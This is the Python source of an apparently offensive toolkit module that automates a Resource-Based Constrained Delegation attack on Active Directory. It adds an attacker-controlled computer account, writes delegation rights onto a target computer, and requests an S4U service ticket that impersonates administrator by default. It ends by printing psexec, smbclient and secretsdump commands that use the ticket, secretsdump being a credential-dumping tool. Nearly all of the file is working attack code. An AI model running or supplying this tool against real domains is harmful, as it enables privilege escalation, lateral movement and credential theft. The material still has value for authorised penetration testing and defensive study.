"""
Resource-Based Constrained Delegation (RBCD) Attack Module
Abuses WriteAccountRestrictions / GenericWrite / GenericAll on a computer object.

Full attack chain:
1. addcomputer.py  - Add attacker-controlled computer account
2. rbcd.py         - Configure delegation (msDS-AllowedToActOnBehalfOfOtherIdentity)
3. getST.py        - Request service ticket via S4U2Self/S4U2Proxy impersonation
4. Export ticket    - Set KRB5CCNAME for pass-the-ticket

Works on Exegol, Kali, BlackArch.
"""

import os
import subprocess
import shutil
import random
import string
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class RBCDAttack(ModuleBase):
    """
    Resource-Based Constrained Delegation attack.
    When you have WriteAccountRestrictions (or GenericWrite/GenericAll) over a
    computer object, abuse RBCD to impersonate any user to that target.
    """

    def __init__(self):
        super().__init__()
        self.name = "WriteAccountRestrictions"
        self.description = "RBCD attack - abuse WriteAccountRestrictions for impersonation"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "rbcd", "delegation", "s4u", "impersonation", "genericwrite",
                     "writeaccountrestrictions", "lateral", "acl", "computer"]
        self.references = [
            "https://www.thehacker.recipes/ad/movement/dacl/rbcd",
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation",
            "https://attack.mitre.org/techniques/T1550/003/",
        ]

        # Core auth
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g. 404finance.local)", required=True)
        self.register_option("USER", "Username with write access on target computer", required=True)
        self.register_option("PASS", "Password for USER", required=True)
        self.register_option("HASHES", "NT/LM hashes (LMhash:NThash) - alternative to PASS", default="")

        # Attack options
        self.register_option("TARGET_COMPUTER", "Target computer to attack (the one you have write access on)", required=True)
        self.register_option("IMPERSONATE", "User to impersonate (e.g. administrator)", default="administrator")
        self.register_option("SPN", "Service to request (e.g. cifs/target.domain.local)", default="")

        # Attacker computer
        self.register_option("COMPUTER_NAME", "Attacker computer name to add (auto-generated if empty)", default="")
        self.register_option("COMPUTER_PASS", "Password for attacker computer (auto-generated if empty)", default="")

        # Cleanup
        self.register_option("CLEANUP", "Remove RBCD delegation after attack",
                             default="no", choices=["yes", "no"])

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        hashes = self.get_option("HASHES")
        target_computer = self.get_option("TARGET_COMPUTER")
        impersonate_user = self.get_option("IMPERSONATE")
        spn = self.get_option("SPN")
        computer_name = self.get_option("COMPUTER_NAME")
        computer_pass = self.get_option("COMPUTER_PASS")
        cleanup = self.get_option("CLEANUP") == "yes"

        # Auto-generate computer name/pass if not set
        if not computer_name:
            computer_name = "UWU" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + "$"
        if not computer_name.endswith("$"):
            computer_name += "$"
        if not computer_pass:
            computer_pass = ''.join(random.choices(string.ascii_letters + string.digits + "!@#", k=16))

        # Auto-build SPN if not set
        if not spn:
            # Strip trailing $ and build FQDN
            target_clean = target_computer.rstrip("$")
            spn = f"cifs/{target_clean}.{domain}"

        # Build auth string for impacket tools
        if hashes:
            auth_flags = f"-hashes '{hashes}'"
            auth_conn = f"{domain}/{user}@{dc_ip}"
        else:
            auth_flags = ""
            auth_conn = f"{domain}/{user}:'{password}'@{dc_ip}"

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"Attacker: {user}")
        self.print_status(f"Target Computer: {target_computer}")
        self.print_status(f"Impersonate: {impersonate_user}")
        self.print_status(f"SPN: {spn}")
        self.print_status(f"Attacker Computer: {computer_name}")
        self.print_line()

        # =====================================================================
        # Step 1: Add attacker-controlled computer account
        # =====================================================================
        self.print_status("Step 1: Adding attacker computer account...")

        success = self._add_computer(dc_ip, domain, user, password, hashes,
                                     computer_name, computer_pass)
        if not success:
            return False

        # =====================================================================
        # Step 2: Configure RBCD delegation
        # =====================================================================
        self.print_status("Step 2: Configuring RBCD delegation...")

        success = self._configure_rbcd(dc_ip, domain, user, password, hashes,
                                       computer_name, target_computer)
        if not success:
            return False

        # =====================================================================
        # Step 3: Request service ticket via S4U
        # =====================================================================
        self.print_status("Step 3: Requesting service ticket via S4U...")

        ccache_file = self._get_service_ticket(dc_ip, domain, computer_name,
                                                computer_pass, spn, impersonate_user)
        if not ccache_file:
            return False

        # =====================================================================
        # Step 4: Cleanup (optional)
        # =====================================================================
        if cleanup:
            self.print_status("Step 4: Cleaning up RBCD delegation...")
            self._cleanup_rbcd(dc_ip, domain, user, password, hashes,
                               computer_name, target_computer)

        # =====================================================================
        # Summary
        # =====================================================================
        self.print_line()
        self.print_good("=" * 60)
        self.print_good("RBCD ATTACK COMPLETE")
        self.print_good("=" * 60)
        self.print_good(f"Ticket: {ccache_file}")
        self.print_good(f"Impersonating: {impersonate_user}")
        self.print_good(f"Service: {spn}")
        self.print_line()
        self.print_status("Use the ticket:")
        self.print_line(f"  export KRB5CCNAME={ccache_file}")
        target_clean = target_computer.rstrip("$")
        self.print_line(f"  psexec.py -k -no-pass {domain}/{impersonate_user}@{target_clean}.{domain}")
        self.print_line(f"  smbclient.py -k -no-pass {domain}/{impersonate_user}@{target_clean}.{domain}")
        self.print_line(f"  secretsdump.py -k -no-pass {domain}/{impersonate_user}@{target_clean}.{domain}")
        self.print_line()
        self.print_status("Attacker computer credentials (for cleanup):")
        self.print_line(f"  Computer: {computer_name}")
        self.print_line(f"  Password: {computer_pass}")

        return True

    # =========================================================================
    # Step 1: Add Computer
    # =========================================================================

    def _add_computer(self, dc_ip, domain, user, password, hashes,
                      computer_name, computer_pass) -> bool:
        """Add an attacker-controlled computer account"""

        # Try addcomputer.py
        tool = find_tool("addcomputer.py")
        if tool:
            cmd = [tool]
        else:
            cmd = ["addcomputer.py"]

        # Build connection string
        if hashes:
            conn_str = f"{domain}/{user}"
            cmd.extend([conn_str, "-hashes", hashes])
        else:
            conn_str = f"{domain}/{user}:{password}"
            cmd.append(conn_str)

        cmd.extend(["-method", "LDAPS"])
        cmd.extend(["-computer-name", computer_name.rstrip("$")])
        cmd.extend(["-computer-pass", computer_pass])
        cmd.extend(["-dc-host", dc_ip])

        result = self._run_tool(cmd, tool)
        output = result.get("output", "")

        if "Successfully added machine account" in output or result.get("rc", 1) == 0:
            self.print_good(f"Computer '{computer_name}' added successfully")
            return True

        # If LDAPS fails, try SAMR method
        if "LDAPS" in output or "SSL" in output or result.get("rc", 1) != 0:
            self.print_warning("LDAPS failed, trying SAMR method...")
            cmd_samr = list(cmd)
            for i, arg in enumerate(cmd_samr):
                if arg == "LDAPS":
                    cmd_samr[i] = "SAMR"
            result = self._run_tool(cmd_samr, tool)
            output = result.get("output", "")
            if "Successfully added machine account" in output or result.get("rc", 1) == 0:
                self.print_good(f"Computer '{computer_name}' added via SAMR")
                return True

        # Check if computer already exists
        if "already exists" in output.lower():
            self.print_warning(f"Computer '{computer_name}' already exists, continuing...")
            return True

        self.print_error(f"Failed to add computer: {output.strip()}")
        return False

    # =========================================================================
    # Step 2: Configure RBCD
    # =========================================================================

    def _configure_rbcd(self, dc_ip, domain, user, password, hashes,
                        computer_name, target_computer) -> bool:
        """Configure RBCD delegation on the target computer"""

        # Try rbcd.py
        tool = find_tool("rbcd.py")
        if tool:
            cmd = [tool]
        else:
            cmd = ["rbcd.py"]

        if hashes:
            conn_str = f"{domain}/{user}"
            cmd.extend([conn_str, "-hashes", hashes])
        else:
            conn_str = f"{domain}/{user}:{password}"
            cmd.append(conn_str)

        cmd.extend(["-delegate-from", computer_name])
        cmd.extend(["-delegate-to", target_computer])
        cmd.extend(["-action", "write"])
        cmd.extend(["-dc-ip", dc_ip])

        result = self._run_tool(cmd, tool)
        output = result.get("output", "")

        if "successfully" in output.lower() or "attribute modified" in output.lower() or result.get("rc", 1) == 0:
            self.print_good(f"RBCD configured: {computer_name} -> {target_computer}")
            return True

        self.print_error(f"Failed to configure RBCD: {output.strip()}")
        return False

    # =========================================================================
    # Step 3: Get Service Ticket
    # =========================================================================

    def _get_service_ticket(self, dc_ip, domain, computer_name, computer_pass,
                            spn, impersonate_user) -> str:
        """Request service ticket via S4U2Self/S4U2Proxy"""

        tool = find_tool("getST.py")
        if tool:
            cmd = [tool]
        else:
            cmd = ["getST.py"]

        # Auth as the attacker computer
        comp_user = computer_name.rstrip("$") + "$"
        conn_str = f"{domain}/{comp_user}:{computer_pass}"
        cmd.append(conn_str)

        cmd.extend(["-spn", spn])
        cmd.extend(["-impersonate", impersonate_user])
        cmd.extend(["-dc-ip", dc_ip])

        result = self._run_tool(cmd, tool)
        output = result.get("output", "")

        # getST.py saves ticket as <user>.ccache
        ccache_file = f"{impersonate_user}.ccache"
        if os.path.isfile(ccache_file):
            self.print_good(f"Service ticket saved: {ccache_file}")
            return os.path.abspath(ccache_file)

        # Check working directory variations
        for candidate in [ccache_file, f"/workspace/{ccache_file}", f"./{ccache_file}"]:
            if os.path.isfile(candidate):
                self.print_good(f"Service ticket saved: {candidate}")
                return os.path.abspath(candidate)

        # Check output for the filename
        if "Saving ticket in" in output:
            for line in output.split("\n"):
                if "Saving ticket in" in line:
                    parts = line.split("Saving ticket in")
                    if len(parts) > 1:
                        ticket_path = parts[1].strip().rstrip(".")
                        if os.path.isfile(ticket_path):
                            self.print_good(f"Service ticket saved: {ticket_path}")
                            return os.path.abspath(ticket_path)

        if "Saving ticket" in output:
            self.print_good("Ticket generated (check working directory)")
            return ccache_file

        self.print_error(f"Failed to get service ticket: {output.strip()}")
        return ""

    # =========================================================================
    # Cleanup
    # =========================================================================

    def _cleanup_rbcd(self, dc_ip, domain, user, password, hashes,
                      computer_name, target_computer) -> bool:
        """Remove RBCD delegation"""
        tool = find_tool("rbcd.py")
        if tool:
            cmd = [tool]
        else:
            cmd = ["rbcd.py"]

        if hashes:
            conn_str = f"{domain}/{user}"
            cmd.extend([conn_str, "-hashes", hashes])
        else:
            conn_str = f"{domain}/{user}:{password}"
            cmd.append(conn_str)

        cmd.extend(["-delegate-from", computer_name])
        cmd.extend(["-delegate-to", target_computer])
        cmd.extend(["-action", "remove"])
        cmd.extend(["-dc-ip", dc_ip])

        result = self._run_tool(cmd, tool)
        output = result.get("output", "")

        if result.get("rc", 1) == 0:
            self.print_good("RBCD delegation removed")
            return True

        self.print_warning(f"Cleanup may have failed: {output.strip()}")
        return False

    # =========================================================================
    # Tool execution helper
    # =========================================================================

    def _run_tool(self, cmd, tool_path=None) -> dict:
        """Run an impacket tool, trying local then fallback to exegol-style execution"""
        # If tool_path found via find_tool, replace script name with full path
        if tool_path and os.path.isfile(tool_path):
            cmd[0] = tool_path

        self.print_status(f"  > {' '.join(cmd[:3])} ...")

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True, timeout=60
            )
            output = result.stdout + result.stderr

            # Print output lines
            for line in output.strip().split("\n"):
                line = line.strip()
                if not line:
                    continue
                if "[+]" in line or "successfully" in line.lower():
                    self.print_good(f"  {line}")
                elif "[-]" in line or "error" in line.lower():
                    self.print_error(f"  {line}")
                elif "[*]" in line:
                    self.print_status(f"  {line}")
                elif "[!]" in line:
                    self.print_warning(f"  {line}")

            return {"rc": result.returncode, "output": output}

        except FileNotFoundError:
            # Tool not found locally, try as shell command (might be in PATH via alias)
            cmd_str = " ".join(f"'{c}'" if " " in c else c for c in cmd)
            try:
                result = subprocess.run(
                    cmd_str, shell=True, capture_output=True, text=True, timeout=60
                )
                output = result.stdout + result.stderr
                return {"rc": result.returncode, "output": output}
            except Exception as e:
                return {"rc": 1, "output": str(e)}

        except subprocess.TimeoutExpired:
            return {"rc": 1, "output": "Command timed out"}
        except Exception as e:
            return {"rc": 1, "output": str(e)}

    def check(self) -> bool:
        """Check if required tools are available"""
        tools = ["addcomputer.py", "rbcd.py", "getST.py"]
        all_found = True
        for tool_name in tools:
            path = find_tool(tool_name)
            if path:
                self.print_good(f"{tool_name} found: {path}")
            else:
                self.print_warning(f"{tool_name} not found in PATH")
                all_found = False
        if not all_found:
            self.print_warning("Some tools missing - they may still work via Exegol aliases")
        return True
